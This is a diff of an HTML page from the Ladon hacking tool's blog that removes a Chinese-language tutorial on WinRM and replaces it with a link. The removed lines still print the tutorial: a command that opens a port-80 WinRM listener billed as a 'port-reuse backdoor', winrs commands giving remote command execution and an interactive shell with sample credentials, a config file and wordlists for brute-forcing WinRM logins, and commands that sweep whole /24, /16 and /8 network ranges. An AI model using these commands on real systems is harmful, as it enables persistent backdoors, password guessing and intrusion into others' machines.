@@ -22,11 +22,8 @@
 <meta name="keywords" content="Ladon,brute force">
 
 
-<meta name="description" content=" 
-
-
-
-简介WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理(WS-Management)标准，使用80端口或者443端口。这样一来，我...">
+<meta name="description" content="http://k8gege.org/Ladon/winrmscan.html
+">
 
 
 <meta name="robots" content="all">
@@ -194,47 +191,7 @@
     </div>
     
     <div class="post-body post-content">
-        <p style="color:#fff;"> 
-<% <span class="archive-article-date">
-Visit <span id="busuanzi_value_page_pv"></span>
-
-%>
-</%></p>
-
-<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>WinRM是WindowsRemoteManagementd（win远程管理）的简称。基于Web服务管理(WS-Management)标准，使用80端口或者443端口。这样一来，我们就可以在对方有设置防火墙的情况下远程管理这台服务器了。</p>
-<p>Server2008R2及往上的系统中默认中都开启该服务，从Server2012系统后开始，该WinRM服务便被设置为默认开启。Win7系统中却默认安装此WinRM服务，但是默认为禁用状态，Win8系统和Win10系统也都默认开启WinRM服务。</p>
-<p>PS：WIN7或2008需要手动开户WINRM</p>
-<h3 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a>默认端口</h3><p>5985/tcp (HTTP)<br>5986/tcp (HTTPS)</p>
-<h3 id="端口复用后门"><a href="#端口复用后门" class="headerlink" title="端口复用后门"></a>端口复用后门</h3><p>对于Windows Server 2012以上的服务器操作系统中，WinRM服务默认启动并监听了5985端口。<br>通过下面的命令，可以新增WinRM一个80端口的监听。<br>winrm set winrm/config/service @{EnableCompatibilityHttpListener=”true”}</p>
-<p>PS：该方法适用于有web的机器，不会开启新端口，也不需要EXE进程或DLL劫持。</p>
-<h3 id="远程执行命令"><a href="#远程执行命令" class="headerlink" title="远程执行命令"></a>远程执行命令</h3><p>通过WinRM连接，并执行whoami命令<br>winrs -r:<a href="http://192.168.1.20" target="_blank" rel="noopener">http://192.168.1.20</a> -u:k8gege -p:k8gege520 whoami</p>
-<p>通过WinRM连接，并获得交互式的shell<br>winrs -r:<a href="http://192.168.1.20" target="_blank" rel="noopener">http://192.168.1.20</a> -u:k8gege -p:k8gege520 cmd</p>
-<h3 id="调用winrm爆破"><a href="#调用winrm爆破" class="headerlink" title="调用winrm爆破"></a>调用winrm爆破</h3><p>由于C#使用WSMan来访问winrm均在各种问题，还不如系统自带命令winrs。<br>当前机器为中文，目标为英文系统，连接提示编码问题，设置对应编码即可<br>其它语言系统，返回不一定是437，具体自行根据需要修改INI脚本。</p>
-<h5 id="WinrmScan-ini"><a href="#WinrmScan-ini" class="headerlink" title="WinrmScan.ini"></a>WinrmScan.ini</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[Ladon]</span><br><span class="line"><span class="comment">#Brute-Force WinRM</span></span><br><span class="line">exe=cmd.exe</span><br><span class="line">arg=/c <span class="string">"chcp 437 &amp; winrs -r:http://<span class="variable">$ip</span>$:5985 -u:<span class="variable">$user</span>$ -p:<span class="variable">$pass</span>$ "</span><span class="built_in">echo</span> isok<span class="string">""</span></span><br><span class="line"><span class="comment">#exe=WinrmScan.exe</span></span><br><span class="line"><span class="comment">#arg=$ip$ $user$ $pass$</span></span><br><span class="line">port=5985</span><br><span class="line">isok=isok</span><br><span class="line"><span class="built_in">log</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p>注意：INI脚本必须为ANSI编码，当前机器与目标必须启用WINRM，且放行5985端口<br>后门：如果被别人添加了复用后门，也可以直接爆破80端口，把5985改成80即可。</p>
-<h3 id="SSH密码爆破-暴力破解"><a href="#SSH密码爆破-暴力破解" class="headerlink" title="SSH密码爆破/暴力破解"></a>SSH密码爆破/暴力破解</h3><h4 id="配置密码爆破参数"><a href="#配置密码爆破参数" class="headerlink" title="配置密码爆破参数"></a>配置密码爆破参数</h4><p>INI脚本仅支持标准的user.txt和pass.txt帐密破解</p>
-<h5 id="user-amp-pass-传统帐密"><a href="#user-amp-pass-传统帐密" class="headerlink" title="user &amp; pass /传统帐密"></a>user &amp; pass /传统帐密</h5><p>user.txt<br>k8gege<br>root</p>
-<p>pass.txt<br>toor<br>k8gege520</p>
-<h4 id="指定IP"><a href="#指定IP" class="headerlink" title="指定IP"></a>指定IP</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8 WinrmScan.ini</span><br></pre></td></tr></table></figure>
-
-<h4 id="扫描C段"><a href="#扫描C段" class="headerlink" title="扫描C段"></a>扫描C段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/c WinrmScan.ini</span><br><span class="line">Ladon 192.168.1.8/24 WinrmScan.ini</span><br></pre></td></tr></table></figure>
-
-<h4 id="扫描B段"><a href="#扫描B段" class="headerlink" title="扫描B段"></a>扫描B段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/b WinrmScan.ini</span><br></pre></td></tr></table></figure>
-
-<h4 id="扫描A段"><a href="#扫描A段" class="headerlink" title="扫描A段"></a>扫描A段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8/a WinrmScan.ini</span><br></pre></td></tr></table></figure>
-
-<h4 id="批量IP"><a href="#批量IP" class="headerlink" title="批量IP"></a>批量IP</h4><p>ip.txt<br>192.168.1.8<br>192.168.1.5<br>192.168.1.109:48</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon WinrmScan.ini</span><br></pre></td></tr></table></figure>
-
-<h4 id="批量C段"><a href="#批量C段" class="headerlink" title="批量C段"></a>批量C段</h4><p>ip24.txt<br>192.168.1.<br>10.1.5.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon WinrmScan.ini</span><br></pre></td></tr></table></figure>
-
-<h4 id="批量B段"><a href="#批量B段" class="headerlink" title="批量B段"></a>批量B段</h4><p>ip16.txt<br>192.168.<br>10.1.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon  WinrmScan.ini</span><br></pre></td></tr></table></figure>
-
-<p>如图，通过5985端口扫描1.20机器登陆口令<br><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/WinrmScan.PNG"></p>
-<h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><p>最新版本：<a href="https://k8gege.org/Download/Ladon.rar">https://k8gege.org/Download/Ladon.rar</a><br>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a></p>
+        <p><a href="http://k8gege.org/Ladon/winrmscan.html">http://k8gege.org/Ladon/winrmscan.html</a></p>
 
     </div>
     
@@ -286,7 +243,7 @@ Visit <span id="busuanzi_value_page_pv"></span>
             Table of Contents
         </h3>
         
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#默认端口"><span class="toc-text">默认端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#端口复用后门"><span class="toc-text">端口复用后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程执行命令"><span class="toc-text">远程执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#调用winrm爆破"><span class="toc-text">调用winrm爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#WinrmScan-ini"><span class="toc-text">WinrmScan.ini</span></a></li></ol></li></ol><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH密码爆破-暴力破解"><span class="toc-text">SSH密码爆破&#x2F;暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#配置密码爆破参数"><span class="toc-text">配置密码爆破参数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#user-amp-pass-传统帐密"><span class="toc-text">user &amp; pass &#x2F;传统帐密</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#指定IP"><span class="toc-text">指定IP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#扫描C段"><span class="toc-text">扫描C段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#扫描B段"><span class="toc-text">扫描B段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#扫描A段"><span class="toc-text">扫描A段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#批量IP"><span class="toc-text">批量IP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#批量C段"><span class="toc-text">批量C段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#批量B段"><span class="toc-text">批量B段</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#工具下载"><span class="toc-text">工具下载</span></a></li>
+        <p>not dir</p>
         
     </div>
 </aside>
